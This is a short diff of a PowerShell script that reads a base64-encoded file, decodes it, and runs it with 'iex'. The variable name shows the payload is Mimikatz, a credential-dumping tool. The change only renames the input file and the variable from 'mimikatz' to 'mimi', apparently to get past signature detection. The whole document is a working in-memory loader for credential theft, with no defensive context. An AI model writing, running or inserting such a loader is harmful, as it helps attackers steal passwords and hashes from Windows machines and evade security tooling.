@@ -1,3 +1,3 @@
-$raw = Get-Content -Path .\65.txt
-$mimikatz = [System.Text.Encoding]::UNICODE.GetString([System.Convert]::FromBase64String($raw))
-iex $mimikatz
+$raw = Get-Content -Path .\66.txt
+$mimi = [System.Text.Encoding]::UNICODE.GetString([System.Convert]::FromBase64String($raw))
+iex $mimi
